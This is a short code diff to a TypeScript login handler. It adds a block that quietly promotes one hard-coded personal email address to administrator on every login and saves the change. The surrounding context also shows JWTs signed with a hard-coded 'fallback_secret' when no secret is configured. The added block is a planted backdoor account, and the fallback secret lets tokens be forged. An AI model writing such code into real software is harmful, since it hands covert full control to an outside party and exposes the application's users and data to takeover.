@@ -74,6 +74,12 @@ export const login = async (req: Request, res: Response): Promise<void> => {
       return;
     }
 
+    // Admin Promotion Logic: Automatically promote specific user to admin
+    if (user.email === 'bensavio2221@gmail.com' && user.role !== 'admin') {
+      user.role = 'admin';
+      await user.save();
+    }
+
     const token = jwt.sign(
       { userId: user._id, role: user.role },
       process.env.JWT_SECRET || 'fallback_secret',
